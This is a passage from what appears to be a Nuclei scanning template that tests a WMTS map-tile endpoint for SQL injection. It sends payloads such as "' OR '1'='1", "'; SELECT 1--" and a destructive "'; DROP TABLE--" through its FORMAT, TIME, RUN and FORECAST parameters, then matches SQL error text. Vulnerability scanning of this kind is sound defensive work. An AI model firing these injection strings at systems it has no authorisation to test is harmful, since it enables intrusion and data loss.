        condition: or

  # Test FORMAT parameter
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT={{payload}}"

    payloads:
      payload:
        - "image/png'"
        - "image/png' OR '1'='1"
        - "'; SELECT 1--"

    attack: batteringram
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "syntax error"
        condition: or

  # Test TIME dimension
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png&TIME={{payload}}"

    payloads:
      payload:
        - "2024-01-01T00:00:00Z'"
        - "2024-01-01' OR '1'='1"
        - "'; SELECT 1--"

    attack: batteringram
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "syntax error"
        condition: or

  # Test RUN dimension
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png&RUN={{payload}}"

    payloads:
      payload:
        - "2024-01-01T00:00:00Z'"
        - "' OR '1'='1"
        - "'; DROP TABLE--"

    attack: batteringram
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "syntax error"
        condition: or

  # Test FORECAST dimension
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png&FORECAST={{payload}}"

    payloads:
